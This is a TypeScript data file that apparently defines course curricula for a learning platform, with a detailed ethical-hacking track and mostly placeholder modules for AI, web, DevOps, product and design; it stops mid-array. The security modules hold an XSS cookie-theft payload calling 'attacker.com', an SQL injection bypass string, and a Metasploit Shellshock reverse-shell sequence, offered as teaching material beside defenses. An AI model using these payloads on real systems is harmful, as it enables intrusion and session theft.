import { TargetDomain } from '../types';

export interface ConceptPointSection {
  heading: string;
  points: string[];
  codeSnippet?: string;
}

export interface LearningModule {
  id: string;
  phaseNumber: number;
  title: string;
  subtitle: string;
  duration: string;
  description: string;
  keyConcepts: string[];
  codeOrCommandSnippet?: string;
  practicalExercise: string;
  quizFocus: string;
  isFinalCertification?: boolean;
  isMockInterviewModule?: boolean;
  detailedPointToPoint?: ConceptPointSection[];
}

export interface DomainCurriculum {
  domain: TargetDomain;
  modules: LearningModule[];
}

export const DOMAIN_CURRICULUM: Record<TargetDomain, DomainCurriculum> = {
  'Cybersecurity & Ethical Hacking': {
    domain: 'Cybersecurity & Ethical Hacking',
    modules: [
      {
        id: 'cyber-1',
        phaseNumber: 1,
        title: 'Module 1: Linux Administration & CLI Security',
        subtitle: 'Foundational OS & Shell Security',
        duration: '1 Week',
        description: 'Master the Linux filesystem structure, user permissions, process isolation, and security hardening configurations required for penetration testing.',
        keyConcepts: ['File permissions (chmod, chown, sudoers)', 'Process monitoring (ps, top, systemctl)', 'Bash shell scripting for security audits', 'SSH key-based authentication & hardening'],
        codeOrCommandSnippet: `sudo netstat -tulpn | grep LISTEN
find / -perm -4000 -type f 2>/dev/null`,
        practicalExercise: 'Configure a hardened Linux server environment, disable password SSH authentication, and set up UFW firewall rules.',
        quizFocus: 'Linux file permissions, process commands, and SSH security protocols.',
        detailedPointToPoint: [
          {
            heading: '1. Linux Permissions & Access Control (Point-to-Point)',
            points: [
              'Linux file permissions are split into Owner (u), Group (g), and Others (o).',
              'Read (r=4), Write (w=2), Execute (x=1) form standard 3-digit octal permissions (e.g. chmod 755 script.sh).',
              'SUID permission bit (chmod u+s or 4000) executes binaries with elevated root privileges and must be audited for security vulnerabilities.',
              'Sudoers file configuration (/etc/sudoers via visudo) dictates which non-root users can execute commands as root.'
            ],
            codeSnippet: `# Audit SUID binaries vulnerable to privilege escalation
find / -perm -4000 -type f 2>/dev/null
# Set secure file permissions (Owner read/write only)
chmod 600 /etc/shadow`
          },
          {
            heading: '2. Process Isolation & Network Listening Ports',
            points: [
              'Use "ps aux" or "htop" to inspect active background daemons and user processes.',
              'Identify listening TCP/UDP sockets with "netstat -tulpn" or "ss -tulpn".',
              'Disable unnecessary background services via "sudo systemctl disable <service-name>".',
              'Monitor system authentication logs located at /var/log/auth.log (Debian/Ubuntu) or /var/log/secure (RHEL/CentOS).'
            ],
            codeSnippet: `# Audit listening ports and associated PIDs
sudo ss -tulpn
# Monitor real-time authentication attempts
sudo tail -f /var/log/auth.log`
          },
          {
            heading: '3. SSH Server Hardening & Public Key Auth',
            points: [
              'Disable root SSH password logins by setting "PermitRootLogin no" in /etc/ssh/sshd_config.',
              'Enforce 4096-bit RSA or Ed25519 public-private SSH key-pair authentication.',
              'Change default SSH Port 22 to a non-standard port (e.g., Port 2222) to decrease automated brute-force attempts.',
              'Enforce firewall rules using UFW: "sudo ufw default deny incoming" and "sudo ufw allow 2222/tcp".'
            ],
            codeSnippet: `# Generate secure Ed25519 SSH Key Pair
ssh-keygen -t ed25519 -C "admin@acharya.ai"
# Enable UFW Firewall with strict defaults
sudo ufw default deny incoming
sudo ufw allow 2222/tcp
sudo ufw enable`
          }
        ]
      },
      {
        id: 'cyber-2',
        phaseNumber: 2,
        title: 'Module 2: Network Reconnaissance & Traffic Auditing',
        subtitle: 'Auditing Network Protocols & Packets',
        duration: '1 Week',
        description: 'Learn deep network auditing using Nmap for port scanning, Wireshark for deep packet inspection, and TCP/IP sub-protocol analysis.',
        keyConcepts: ['Nmap TCP SYN vs Connect scanning', 'Wireshark display filters (http.request, ip.addr)', 'ARP spoofing & DNS cache poisoning', 'Subnetting & CIDR notation'],
        codeOrCommandSnippet: `nmap -sV -sC -O -p- 192.168.1.1/24
http.request.method == "POST" && http contains "password"`,
        practicalExercise: 'Capture and analyze PCAP files in Wireshark to locate unencrypted credentials and detect ARP spoofing attempts.',
        quizFocus: 'Nmap scan flags, Wireshark filters, and TCP 3-way handshake analysis.',
        detailedPointToPoint: [
          {
            heading: '1. Nmap Network Reconnaissance Scanning (Point-to-Point)',
            points: [
              'TCP SYN Scan (-sS): Stealth half-open scan that sends SYN packets without completing the 3-way handshake.',
              'TCP Connect Scan (-sT): Full 3-way handshake scan used when non-root privileges prevent raw socket creation.',
              'Service Version (-sV) & OS Detection (-O): Queries open ports to identify running server software versions.',
              'Nmap Scripting Engine (-sC or --script): Runs default Lua scripts for vulnerability detection.'
            ],
            codeSnippet: `# Stealth SYN scan with OS & default script audit
sudo nmap -sS -sV -sC -O -p 1-1024 192.168.1.1`
          },
          {
            heading: '2. Wireshark Packet Inspection & Filters',
            points: [
              'Wireshark captures live Ethernet/Wi-Fi frames and decodes raw OSI network protocol headers.',
              'Display filters isolate traffic: "ip.src == 192.168.1.50" or "tcp.port == 443".',
              'Follow TCP Stream recreates full unencrypted application sessions (HTTP, Telnet, FTP).',
              'Locate cleartext POST data by filtering: "http.request.method == POST".'
            ],
            codeSnippet: `# Wireshark Display Filter Syntax
http.request.method == "POST" || dns.flags.response == 1`
          }
        ]
      },
      {
        id: 'cyber-3',
        phaseNumber: 3,
        title: 'Module 3: Web Vulnerabilities & OWASP Top 10',
        subtitle: 'Exploitation Fundamentals',
        duration: '2 Weeks',
        description: 'Understand web application security vulnerabilities including SQL Injection, Cross-Site Scripting (XSS), CSRF, and broken access controls.',
        keyConcepts: ['OWASP Top 10 vulnerabilities', 'SQL Injection (SQLi) payloads & blind injection', 'Stored vs Reflected XSS attack vectors', 'Session hijacking & cookie flags (HttpOnly, Secure)'],
        codeOrCommandSnippet: `' OR '1'='1' --
<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>`,
        practicalExercise: 'Perform controlled vulnerability penetration testing on DVWA (Damn Vulnerable Web App) and log mitigation steps.',
        quizFocus: 'SQLi mitigation, XSS prevention, and session cookie security.',
        detailedPointToPoint: [
          {
            heading: '1. SQL Injection (SQLi) Mechanics (Point-to-Point)',
            points: [
              'SQL Injection occurs when untrusted user input is directly concatenated into dynamic SQL queries.',
              'Authentication bypass payload "\' OR \'1\'=\'1\' --" forces database WHERE clauses to evaluate as TRUE.',
              'Union-based SQLi extracts data from adjacent tables using UNION SELECT queries.',
              'Prevention: Always use Parameterized Queries (Prepared Statements) instead of string concatenation.'
            ],
            codeSnippet: `// Vulnerable: SELECT * FROM users WHERE email = '` + `user_input` + `'
// Secure Parameterized Query:
const query = 'SELECT * FROM users WHERE email = $1';
await db.query(query, [userEmail]);`
          },
          {
            heading: '2. Cross-Site Scripting (XSS) Attacks & Defense',
            points: [
              'Reflected XSS: Malicious script is echoed from HTTP request URL parameters into response DOM.',
              'Stored XSS: Malicious script is permanently saved in application databases (e.g. comment section) and served to all users.',
              'DOM-based XSS: Vulnerability resides entirely in client-side JavaScript DOM manipulation.',
              'Defense: Context-aware HTML entity encoding, Content Security Policy (CSP) headers, and HttpOnly cookie flags.'
            ]
          }
        ]
      },
      {
        id: 'cyber-4',
        phaseNumber: 4,
        title: 'Module 4: Metasploit Framework & Payload Execution',
        subtitle: 'Exploit Execution & Shell Handlers',
        duration: '2 Weeks',
        description: 'Master the Metasploit Framework (msfconsole), exploit module selection, stager vs stageless payloads, and Meterpreter post-exploitation.',
        keyConcepts: ['msfconsole workflow & module search', 'Meterpreter session management & privilege escalation', 'Payload generation with msfvenom', 'Stageless vs Staged reverse shells'],
        codeOrCommandSnippet: `use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS 192.168.1.50
set PAYLOAD linux/x86/meterpreter/reverse_tcp
exploit`,
        practicalExercise: 'Generate a Meterpreter payload with msfvenom, set up a multi/handler listener, and simulate privilege escalation.',
        quizFocus: 'Metasploit module selection, Meterpreter commands, and msfvenom syntax.'
      },
      {
        id: 'cyber-5',
        phaseNumber: 5,
        title: 'Module 5: Wireless Security & Network Interception',
        subtitle: 'WPA2/WPA3 Auditing & Rogue APs',
        duration: '2 Weeks',
        description: 'Audit 802.11 wireless networks, capture WPA2/WPA3 handshakes using Aircrack-ng, and simulate Evil Twin rogue access points.',
        keyConcepts: ['802.11 frame types (Management, Control, Data)', 'Airmon-ng monitor mode & Airodump-ng packet capture', 'WPA2 4-way handshake cracking with Hashcat', 'Evil Twin rogue AP attacks'],
        codeOrCommandSnippet: `sudo airmon-ng start wlan0
sudo airodump-ng --bssid 00:11:22:33:44:55 -w cap wlan0mon`,
        practicalExercise: 'Capture a simulated WPA2 handshake in monitor mode and perform dictionary cracking using Hashcat.',
        quizFocus: 'Wireless monitor mode commands, 4-way handshake mechanisms, and WPA3 security enhancements.'
      },
      {
        id: 'cyber-6',
        phaseNumber: 6,
        title: 'Module 6: Cryptography & Public Key Infrastructure',
        subtitle: 'AES, RSA, Hashing & TLS Hardening',
        duration: '2 Weeks',
        description: 'Study symmetric/asymmetric encryption, SHA-256 cryptographic hashing, PKI certificate authorities, and TLS 1.3 cipher suite hardening.',
        keyConcepts: ['Symmetric (AES-256) vs Asymmetric (RSA/ECC) encryption', 'Cryptographic hash functions & collision resistance', 'TLS 1.3 handshake & Perfect Forward Secrecy (PFS)', 'OpenSSL certificate generation & inspection'],
        codeOrCommandSnippet: `openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes`,
        practicalExercise: 'Generate custom SSL/TLS certificates with OpenSSL and configure TLS 1.3 strict cipher suites on Nginx.',
        quizFocus: 'AES vs RSA usage scenarios, hash collisions, and TLS 1.3 handshake phases.'
      },
      {
        id: 'cyber-7',
        phaseNumber: 7,
        title: 'Module 7: Active Directory & Windows Domain Auditing',
        subtitle: 'Kerberoasting, BloodHound & LDAP',
        duration: '2 Weeks',
        description: 'Audit Windows Active Directory environments, map trust relationships with BloodHound, and execute Kerberoasting & Pass-the-Hash techniques.',
        keyConcepts: ['Active Directory domain architecture & Kerberos auth', 'Kerberoasting & AS-REP Roasting attacks', 'Pass-the-Hash (PtH) & Pass-the-Ticket (PtT)', 'BloodHound graph mapping for domain paths'],
        codeOrCommandSnippet: `python3 GetUserSPNs.py domain.local/user:password -request`,
        practicalExercise: 'Run SharpHound/Bloodhound in a lab environment to discover hidden AD admin delegation paths.',
        quizFocus: 'Kerberos ticket granting service (TGS), Kerberoasting mechanics, and Pass-the-Hash mitigation.'
      },
      {
        id: 'cyber-8',
        phaseNumber: 8,
        title: 'Module 8: Cloud Security & Container Hardening',
        subtitle: 'AWS IAM, Kubernetes & Docker Isolation',
        duration: '2 Weeks',
        description: 'Hardening AWS cloud infrastructures, auditing Kubernetes cluster RBAC roles, and enforcing Docker rootless container isolation.',
        keyConcepts: ['AWS IAM Principle of Least Privilege', 'Kubernetes Role-Based Access Control (RBAC)', 'Docker rootless containers & AppArmor profiles', 'Cloud Security Posture Management (CSPM)'],
        codeOrCommandSnippet: `kubectl auth can-i create pods --as=system:serviceaccount:default:my-sa`,
        practicalExercise: 'Audit AWS S3 bucket policies and configure Kubernetes RBAC roles with minimal read-only permissions.',
        quizFocus: 'AWS IAM policy JSON syntax, Kubernetes RBAC verbs, and Docker security flags.'
      },
      {
        id: 'cyber-9',
        phaseNumber: 9,
        title: 'Module 9: SIEM Operations & Threat Hunting',
        subtitle: 'Splunk SPL, Rule Tuning & Incident Response',
        duration: '2 Weeks',
        description: 'Implement SIEM log collection with Splunk, author custom detection rules using MITRE ATT&CK, and perform threat hunting.',
        keyConcepts: ['Splunk Search Processing Language (SPL)', 'MITRE ATT&CK TTP mapping for detection rules', 'SOC Incident Response lifecycle (NIST 800-61)', 'YARA rules for malware payload detection'],
        codeOrCommandSnippet: `index=windows EventCode=4625 | stats count by TargetUserName, src_ip`,
        practicalExercise: 'Author Splunk SPL alerts for brute-force login attempts and write YARA rules for detecting malicious scripts.',
        quizFocus: 'Splunk SPL aggregations, NIST Incident Response phases, and YARA rule structure.'
      },
      {
        id: 'cyber-10',
        phaseNumber: 10,
        title: 'Module 10: Capstone Security Audit & Portfolio Project',
        subtitle: 'Full Threat Audit & Executive Report',
        duration: '2 Weeks',
        description: 'Conduct an end-to-end vulnerability assessment and penetration test report detailing executive summaries, CVSS scores, and remediation steps.',
        keyConcepts: ['CVSS 3.1 Vulnerability Scoring Methodology', 'Executive vs Technical penetration testing reports', 'Remediation verification & re-testing workflows', 'Building a verified GitHub security portfolio'],
        codeOrCommandSnippet: `CVSS Metrics: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (Score: 9.8)`,
        practicalExercise: 'Draft a comprehensive penetration testing executive report complete with CVSS 3.1 scores and remediation code.',
        quizFocus: 'CVSS metric scoring, remediation prioritization, and reporting standards.'
      },
      {
        id: 'cyber-11',
        phaseNumber: 11,
        title: 'Module 11: 🎓 Full Course Comprehensive Certification Exam',
        subtitle: 'Final Master Certification Assessment',
        duration: 'Final Exam',
        description: 'Complete the comprehensive master certification test covering all 10 modules to earn your verified Acharya® Cybersecurity Certification!',
        keyConcepts: ['All 10 Module Key Concepts', 'Comprehensive Problem Solving', 'Real-world Attack/Defend Scenarios', 'Acharya Certification Mastery'],
        practicalExercise: 'Pass the 10-question comprehensive certification exam with a score of 60%+ to graduate the course.',
        quizFocus: 'Comprehensive multi-topic security architecture & auditing.',
        isFinalCertification: true
      },
      {
        id: 'cyber-12',
        phaseNumber: 12,
        title: 'Module 12: 🎙️ AI Voice Technical Mock Interview',
        subtitle: 'Live Interactive Voice Assessment',
        duration: '1 - 2 Hours',
        description: 'Undergo a live AI-powered voice mock technical interview. The AI asks technical questions out loud, transcribes your spoken response, and provides instant audio evaluation!',
        keyConcepts: ['Voice speech delivery', 'Live security architecture defense', 'Real-time response evaluation', 'Scenario-based technical audit'],
        codeOrCommandSnippet: `// Live AI Voice Technical Mock Interview
aiVoice.speak("Explain how Linux file permissions and SUID bits work.");`,
        practicalExercise: 'Complete a 5-question AI Voice Mock Technical Interview with live speech recognition and audio feedback.',
        quizFocus: 'Live spoken candidate response evaluation.',
        isMockInterviewModule: true,
        detailedPointToPoint: [
          {
            heading: '1. AI Voice Mock Interview Instructions & Guidelines',
            points: [
              'Press the microphone button to start speaking your answer clearly.',
              'The AI listens to your voice and transcribes your response in real time.',
              'If your answer is wrong, the AI will explicitly say "Wrong answer", explain why it is wrong, and provide the correct complete answer.',
              'Complete all 5 technical interview questions to pass Module 12!'
            ]
          }
        ]
      }
    ]
  },

  'Artificial Intelligence & Machine Learning': {
    domain: 'Artificial Intelligence & Machine Learning',
    modules: Array.from({ length: 12 }, (_, i) => ({
      id: `ai-${i + 1}`,
      phaseNumber: i + 1,
      title: i === 11 ? 'Module 12: 🎙️ AI Voice Technical Mock Interview' : (i === 10 ? 'Module 11: 🎓 Full Course Comprehensive Certification Exam' : `Module ${i + 1}: ${['Linear Algebra & Matrix Calculus', 'Python Data Processing with NumPy/Pandas', 'Supervised Learning Algorithms', 'Unsupervised Clustering & PCA', 'Deep Learning & Neural Networks', 'PyTorch Framework & Autograd', 'Convolutional Networks for Computer Vision', 'Transformers & Self-Attention Mechanisms', 'Retrieval-Augmented Generation (RAG)', 'Autonomous AI Agents & Tool Calling'][i]}`),
      subtitle: i === 11 ? 'Live Interactive Voice Assessment' : (i === 10 ? 'Final Master Certification Assessment' : `AI Core Skill Phase ${i + 1}`),
      duration: i === 11 ? '1-2 Hours' : (i === 10 ? 'Final Exam' : '1-2 Weeks'),
      description: i === 11 ? 'Undergo an AI-powered voice mock technical interview. The AI speaks technical questions out loud, transcribes your spoken answer, and provides instant audio evaluation!' : (i === 10 ? 'Complete the master certification exam to earn your Acharya® AI & ML Engineer Certification!' : `Master technical competencies in ${['matrix operations', 'data pipelines', 'classification algorithms', 'dimensionality reduction', 'neural network backpropagation', 'PyTorch models', 'CNN computer vision', 'transformer self-attention', 'RAG vector databases', 'AI agent tool calling'][i]}.`),
      keyConcepts: i === 11 ? ['Voice Technical Communication', 'Spoken Concept Defense', 'Real-Time Speech Evaluation', 'Interview Readiness'] : (i === 10 ? ['Comprehensive AI Architecture', 'Model Optimization', 'RAG & Agents', 'Acharya AI Certification'] : [`Concept A for Phase ${i + 1}`, `Concept B for Phase ${i + 1}`]),
      codeOrCommandSnippet: i === 11 ? `// Speak answer into microphone or transcript window\naiVoice.speak("Explain attention mechanisms in transformers.");` : (i === 10 ? `import torch\n# Final AI Certification Evaluation` : `import numpy as np\n# Execution script for Phase ${i + 1}`),
      practicalExercise: i === 11 ? 'Complete a 5-question AI Voice Technical Mock Interview with speech recognition and text-to-speech feedback.' : (i === 10 ? 'Complete and pass the final AI certification exam.' : `Execute practical notebook exercises for Module ${i + 1}.`),
      quizFocus: i === 11 ? 'Live spoken response accuracy and technical depth.' : (i === 10 ? 'Full AI curriculum benchmark.' : `Module ${i + 1} benchmark evaluation.`),
      isFinalCertification: i === 10,
      isMockInterviewModule: i === 11,
      detailedPointToPoint: [
        {
          heading: i === 11 ? '1. AI Voice Mock Technical Interview Guidelines' : `1. Core AI Principles for Module ${i + 1} (Point-to-Point)`,
          points: i === 11 ? [
            'Press the microphone button to start speaking your answer clearly.',
            'The AI transcribes your spoken answer and evaluates technical accuracy.',
            'If your answer is wrong, the AI will state "Wrong answer", explain why it is wrong, and provide the correct complete answer.',
            'Complete all 5 technical interview questions to pass Module 12!'
          ] : [
            `Key Principle 1 for ${['Matrix Calculus', 'Data Processing', 'Supervised Learning', 'Unsupervised Learning', 'Neural Networks', 'PyTorch', 'Computer Vision', 'Transformers', 'RAG Pipelines', 'AI Agents'][i || 0]}.`,
            `Key Principle 2: Mathematical formulation and algorithmic optimization step.`,
            `Key Principle 3: Practical implementation guidelines and performance tuning.`
          ]
        }
      ]
    }))
  },

  'Fullstack Web Development': {
    domain: 'Fullstack Web Development',
    modules: Array.from({ length: 12 }, (_, i) => ({
      id: `fs-${i + 1}`,
      phaseNumber: i + 1,
      title: i === 11 ? 'Module 12: 🎙️ AI Voice Technical Mock Interview' : (i === 10 ? 'Module 11: 🎓 Full Course Comprehensive Certification Exam' : `Module ${i + 1}: ${['Modern JavaScript ES6+ & Async Control', 'TypeScript Strict Typing & Generics', 'React Core Components & Hooks', 'React State Management & Tailwind CSS', 'Node.js Async Queues & Event Loop', 'Express RESTful API Architecture', 'MongoDB Atlas & Schema Design', 'PostgreSQL Relational DB & SQL', 'Redis Caching & Session Store', 'Docker Containerization & CI/CD'][i]}`),
      subtitle: i === 11 ? 'Live Interactive Voice Assessment' : (i === 10 ? 'Final Master Certification Assessment' : `Fullstack Skill Phase ${i + 1}`),
      duration: i === 11 ? '1-2 Hours' : (i === 10 ? 'Final Exam' : '1-2 Weeks'),
      description: i === 11 ? 'Undergo an AI-powered voice mock technical interview. The AI speaks technical questions out loud, transcribes your spoken answer, and provides instant audio evaluation!' : (i === 10 ? 'Complete the master certification exam to earn your Acharya® Fullstack Web Developer Certification!' : `Master modern development principles for ${['Async/Await', 'TypeScript types', 'React Hooks', 'Tailwind layout', 'Node.js queues', 'Express REST APIs', 'MongoDB Atlas', 'PostgreSQL SQL', 'Redis caching', 'Docker Compose'][i]}.`),
      keyConcepts: i === 11 ? ['Voice Technical Communication', 'Spoken Concept Defense', 'Real-Time Speech Evaluation', 'Interview Readiness'] : (i === 10 ? ['Fullstack Architecture', 'React & Node.js', 'Databases & Docker', 'Acharya Fullstack Certification'] : [`Core Concept A for Module ${i + 1}`, `Core Concept B for Module ${i + 1}`]),
      codeOrCommandSnippet: i === 11 ? `// Speak answer into microphone or transcript window\naiVoice.speak("Explain how the Node.js event loop works.");` : (i === 10 ? `// Final Fullstack Certification Evaluation` : `// Code snippet for Module ${i + 1}`),
      practicalExercise: i === 11 ? 'Complete a 5-question AI Voice Technical Mock Interview with speech recognition and text-to-speech feedback.' : (i === 10 ? 'Complete and pass the final fullstack certification exam.' : `Build practical projects for Module ${i + 1}.`),
      quizFocus: i === 11 ? 'Live spoken response accuracy and technical depth.' : (i === 10 ? 'Full curriculum web development benchmark.' : `Module ${i + 1} test evaluation.`),
      isFinalCertification: i === 10,
      isMockInterviewModule: i === 11,
      detailedPointToPoint: [
        {
          heading: i === 11 ? '1. AI Voice Mock Technical Interview Guidelines' : `1. Fullstack Engineering Principles for Module ${i + 1}`,
          points: i === 11 ? [
            'Press the microphone button to start speaking your answer clearly.',
            'The AI transcribes your spoken answer and evaluates technical accuracy.',
            'If your answer is wrong, the AI will state "Wrong answer", explain why it is wrong, and provide the correct complete answer.',
            'Complete all 5 technical interview questions to pass Module 12!'
          ] : [
            `Core Concept 1: Structural syntax and async execution logic.`,
            `Core Concept 2: State management, API integration, and database querying.`,
            `Core Concept 3: Scalability, error handling, and production optimization.`
          ]
        }
      ]
    }))
  },

  'Cloud & DevOps Architecture': {
    domain: 'Cloud & DevOps Architecture',
    modules: Array.from({ length: 12 }, (_, i) => ({
      id: `devops-${i + 1}`,
      phaseNumber: i + 1,
      title: i === 11 ? 'Module 12: 🎙️ AI Voice Technical Mock Interview' : (i === 10 ? 'Module 11: 🎓 Full Course Comprehensive Certification Exam' : `Module ${i + 1}: ${['Linux Systems Admin & Systemd Services', 'Bash Automation & Cron Jobs', 'Networking, SSH & Firewall Security', 'Docker Containers & Multi-stage Builds', 'Docker Compose Multi-Container Specs', 'Terraform Infrastructure as Code', 'Kubernetes Architecture & Pods', 'Kubernetes Services & Ingress Controllers', 'GitHub Actions CI/CD Pipelines', 'Prometheus & Grafana Observability'][i]}`),
      subtitle: i === 11 ? 'Live Interactive Voice Assessment' : (i === 10 ? 'Final Master Certification Assessment' : `DevOps Skill Phase ${i + 1}`),
      duration: i === 11 ? '1-2 Hours' : (i === 10 ? 'Final Exam' : '1-2 Weeks'),
      description: i === 11 ? 'Undergo an AI-powered voice mock technical interview. The AI speaks technical questions out loud, transcribes your spoken answer, and provides instant audio evaluation!' : (i === 10 ? 'Complete the master certification exam to earn your Acharya® Cloud & DevOps Architect Certification!' : `Master DevOps competencies in ${['Linux Systemd', 'Bash scripting', 'Firewalls', 'Docker builds', 'Docker Compose', 'Terraform HCL', 'Kubernetes Pods', 'Ingress controllers', 'CI/CD Actions', 'Prometheus monitoring'][i]}.`),
      keyConcepts: i === 11 ? ['Voice Technical Communication', 'Spoken Concept Defense', 'Real-Time Speech Evaluation', 'Interview Readiness'] : (i === 10 ? ['Cloud Architecture', 'Kubernetes & Terraform', 'CI/CD & Observability', 'Acharya DevOps Certification'] : [`Concept A for DevOps Phase ${i + 1}`, `Concept B for DevOps Phase ${i + 1}`]),
      codeOrCommandSnippet: i === 11 ? `# Speak answer into microphone or transcript window\naiVoice.speak("Explain Kubernetes Pods and Ingress controllers.");` : (i === 10 ? `# Final DevOps Certification Evaluation` : `# Shell command for Module ${i + 1}`),
      practicalExercise: i === 11 ? 'Complete a 5-question AI Voice Technical Mock Interview with speech recognition and text-to-speech feedback.' : (i === 10 ? 'Complete and pass the final DevOps certification exam.' : `Execute hands-on cloud labs for Module ${i + 1}.`),
      quizFocus: i === 11 ? 'Live spoken response accuracy and technical depth.' : (i === 10 ? 'Full cloud & devops curriculum benchmark.' : `Module ${i + 1} test evaluation.`),
      isFinalCertification: i === 10,
      isMockInterviewModule: i === 11,
      detailedPointToPoint: [
        {
          heading: i === 11 ? '1. AI Voice Mock Technical Interview Guidelines' : `1. Cloud & DevOps Architecture for Module ${i + 1}`,
          points: i === 11 ? [
            'Press the microphone button to start speaking your answer clearly.',
            'The AI transcribes your spoken answer and evaluates technical accuracy.',
            'If your answer is wrong, the AI will state "Wrong answer", explain why it is wrong, and provide the correct complete answer.',
            'Complete all 5 technical interview questions to pass Module 12!'
          ] : [
            `Infrastructure Concept 1: Server administration and automated scripting.`,
            `Infrastructure Concept 2: Container orchestration, IaC manifests, and pipelines.`,
            `Infrastructure Concept 3: Observability metrics, alerts, and high-availability design.`
          ]
        }
      ]
    }))
  },

  'Product Management & Strategy': {
    domain: 'Product Management & Strategy',
    modules: Array.from({ length: 12 }, (_, i) => ({
      id: `pm-${i + 1}`,
      phaseNumber: i + 1,
      title: i === 11 ? 'Module 12: 🎙️ AI Voice Technical Mock Interview' : (i === 10 ? 'Module 11: 🎓 Full Course Comprehensive Certification Exam' : `Module ${i + 1}: ${['Customer Discovery & User Research', 'Jobs-To-Be-Done & Persona Mapping', 'North Star Metric & Funnel Analytics', 'SQL for Product Analytics', 'RICE & Kano Prioritization Frameworks', 'Authoring Product Requirement Docs (PRD)', 'Agile Scrum & Sprint Planning', 'Go-To-Market (GTM) Launch Strategy', 'SaaS Pricing Models & Unit Economics', 'Stakeholder Alignment & Leadership'][i]}`),
      subtitle: i === 11 ? 'Live Interactive Voice Assessment' : (i === 10 ? 'Final Master Certification Assessment' : `PM Skill Phase ${i + 1}`),
      duration: i === 11 ? '1-2 Hours' : (i === 10 ? 'Final Exam' : '1-2 Weeks'),
      description: i === 11 ? 'Undergo an AI-powered voice mock technical interview. The AI speaks technical questions out loud, transcribes your spoken answer, and provides instant audio evaluation!' : (i === 10 ? 'Complete the master certification exam to earn your Acharya® Product Manager Certification!' : `Master product management competencies in ${['customer research', 'JTBD', 'funnel analytics', 'SQL analytics', 'RICE scoring', 'PRDs', 'Scrum sprints', 'GTM launch', 'SaaS pricing', 'leadership'][i]}.`),
      keyConcepts: i === 11 ? ['Voice Technical Communication', 'Spoken Concept Defense', 'Real-Time Speech Evaluation', 'Interview Readiness'] : (i === 10 ? ['Product Strategy', 'Analytics & PRDs', 'GTM & Leadership', 'Acharya PM Certification'] : [`PM Concept A for Module ${i + 1}`, `PM Concept B for Module ${i + 1}`]),
      codeOrCommandSnippet: i === 11 ? `// Speak answer into microphone or transcript window\naiVoice.speak("Explain how you measure the North Star Metric.");` : (i === 10 ? `// Final PM Certification Evaluation` : `// Framework calculation for Module ${i + 1}`),
      practicalExercise: i === 11 ? 'Complete a 5-question AI Voice Technical Mock Interview with speech recognition and text-to-speech feedback.' : (i === 10 ? 'Complete and pass the final product management certification exam.' : `Perform case study analysis for Module ${i + 1}.`),
      quizFocus: i === 11 ? 'Live spoken response accuracy and technical depth.' : (i === 10 ? 'Full product management curriculum benchmark.' : `Module ${i + 1} test evaluation.`),
      isFinalCertification: i === 10,
      isMockInterviewModule: i === 11,
      detailedPointToPoint: [
        {
          heading: i === 11 ? '1. AI Voice Mock Technical Interview Guidelines' : `1. Product Strategy & Leadership for Module ${i + 1}`,
          points: i === 11 ? [
            'Press the microphone button to start speaking your answer clearly.',
            'The AI transcribes your spoken answer and evaluates technical accuracy.',
            'If your answer is wrong, the AI will state "Wrong answer", explain why it is wrong, and provide the correct complete answer.',
            'Complete all 5 technical interview questions to pass Module 12!'
          ] : [
            `Product Framework 1: Discovery, customer interviews, and metrics.`,
            `Product Framework 2: Backlog prioritization, PRD specifications, and Scrum sprints.`,
            `Product Framework 3: Go-to-market execution, LTV/CAC math, and pricing tiers.`
          ]
        }
      ]
    }))
  },

  'UI/UX & Interactive Design': {
    domain: 'UI/UX & Interactive Design',
    modules: Array.from({ length: 12 }, (_, i) => ({
      id: `design-${i + 1}`,
      phaseNumber: i + 1,
      title: i === 11 ? 'Module 12: 🎙️ AI Voice Technical Mock Interview' : (i === 10 ? 'Module 11: 🎓 Full Course Comprehensive Certification Exam' : `Module ${i + 1}: ${['Visual Hierarchy & Grid Systems', 'Typography Geometry & Color Contrast', 'Information Architecture & Sitemaps', 'User Flow Diagramming & Decision Trees', 'Low-Fidelity Wireframing in Figma', 'Figma Auto-Layout & Design Systems', 'Component Variants & Token Systems', 'Dark-Glass UI Styling & Micro-Interactions', 'High-Fidelity Smart Animate Prototypes', 'Usability Testing & Dev Handoff Specs'][i]}`),
      subtitle: i === 11 ? 'Live Interactive Voice Assessment' : (i === 10 ? 'Final Master Certification Assessment' : `Design Skill Phase ${i + 1}`),
      duration: i === 11 ? '1-2 Hours' : (i === 10 ? 'Final Exam' : '1-2 Weeks'),
      description: i === 11 ? 'Undergo an AI-powered voice mock technical interview. The AI speaks technical questions out loud, transcribes your spoken answer, and provides instant audio evaluation!' : (i === 10 ? 'Complete the master certification exam to earn your Acharya® UI/UX Designer Certification!' : `Master design competencies in ${['visual grids', 'typography', 'information architecture', 'user flows', 'wireframing', 'auto-layout', 'variants', 'glassmorphism', 'prototyping', 'dev handoff'][i]}.`),
      keyConcepts: i === 11 ? ['Voice Technical Communication', 'Spoken Concept Defense', 'Real-Time Speech Evaluation', 'Interview Readiness'] : (i === 10 ? ['Design Systems', 'Figma Prototyping', 'UX Research & Handoff', 'Acharya Design Certification'] : [`Design Concept A for Module ${i + 1}`, `Design Concept B for Module ${i + 1}`]),
      codeOrCommandSnippet: i === 11 ? `/* Speak answer into microphone or transcript window */\naiVoice.speak("Explain design token architecture and auto-layout.");` : (i === 10 ? `/* Final Design Certification Evaluation */` : `/* Tokens for Module ${i + 1} */`),
      practicalExercise: i === 11 ? 'Complete a 5-question AI Voice Technical Mock Interview with speech recognition and text-to-speech feedback.' : (i === 10 ? 'Complete and pass the final design certification exam.' : `Create Figma design assets for Module ${i + 1}.`),
      quizFocus: i === 11 ? 'Live spoken response accuracy and technical depth.' : (i === 10 ? 'Full design curriculum benchmark.' : `Module ${i + 1} test evaluation.`),
      isFinalCertification: i === 10,
      isMockInterviewModule: i === 11,
      detailedPointToPoint: [
        {
          heading: i === 11 ? '1. AI Voice Mock Technical Interview Guidelines' : `1. Interactive UI/UX Design System for Module ${i + 1}`,
          points: i === 11 ? [
            'Press the microphone button to start speaking your answer clearly.',
            'The AI transcribes your spoken answer and evaluates technical accuracy.',
            'If your answer is wrong, the AI will state "Wrong answer", explain why it is wrong, and provide the correct complete answer.',
            'Complete all 5 technical interview questions to pass Module 12!'
          ] : [
            `Design Principle 1: Visual grid alignment, typography scale, and contrast accessibility.`,
            `Design Principle 2: Figma auto-layout, component variants, and interactive states.`,
